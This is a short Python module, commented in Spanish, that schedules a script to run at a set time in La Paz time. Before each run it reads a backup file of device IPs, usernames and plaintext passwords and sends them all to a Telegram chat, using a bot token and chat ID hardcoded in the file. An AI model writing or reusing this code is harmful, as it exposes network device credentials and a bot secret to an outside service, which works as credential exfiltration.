import sys
import threading
import time
import subprocess
from datetime import datetime
import pytz
import os
import requests
TOKEN = '8154946024:AAFEbU1TRZ8ZusCLxrKZ0KG8t-a7KB4Tp9w'  
CHAT_ID = 1242093074
def _schedule_execution(run_at: datetime, script_path: str):
    """
    Hilo que duerme hasta run_at y luego ejecuta el script con el intérprete de Python.
    """
    def worker():
        now = datetime.now(pytz.timezone('America/La_Paz'))
        delay = (run_at - now).total_seconds()
        if delay > 0:
            print(f"[Scheduler] Esperando {delay:.1f}s para ejecutar {script_path}")
            time.sleep(delay)
        else:
            print(f"[Scheduler] ¡Hora pasada! Ejecutando inmediatamente {script_path}")
        
        alarmaConfigDevice()
        subprocess.run([sys.executable, script_path])

    hilo = threading.Thread(target=worker, daemon=True)
    hilo.start()
    return hilo

def alarmaConfigDevice():
    this_file      = os.path.abspath(__file__)
    funcionalidades = os.path.dirname(this_file)
    proyecto       = os.path.dirname(funcionalidades)
    backups_dir    = os.path.join(proyecto, 'backups')
    archivo        = os.path.join(backups_dir, 'IpUserPassword.txt')

    encabezado = (
        " *Atención!* \n"
        "Se han realizado modificaciones en los dispositivos con las siguientes credenciales:\n"
    )

    credenciales = []
    with open(archivo, 'r') as f:
        for linea in f:
            linea = linea.strip()
            if not linea:
                continue
            partes = [p.split(":", 1)[1].strip() for p in linea.split(",")]
            ip, user, pwd = partes
            credenciales.append(f"• IP: `{ip}`\n  User: `{user}`\n  Password: `{pwd}`")

    if not credenciales:
        print(" No hay credenciales en el archivo.")
        return

    texto = encabezado + "\n".join(credenciales)

    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    params = {
        "chat_id": CHAT_ID,
        "text": texto
    }

    try:
        resp = requests.get(url, params=params, timeout=10)
        if resp.status_code == 200:
            print("Alerta enviada con éxito.")
        else:
            print("Error al enviar la alerta:", resp.text)
    except requests.exceptions.RequestException as e:
        print("Error de conexión:", e)
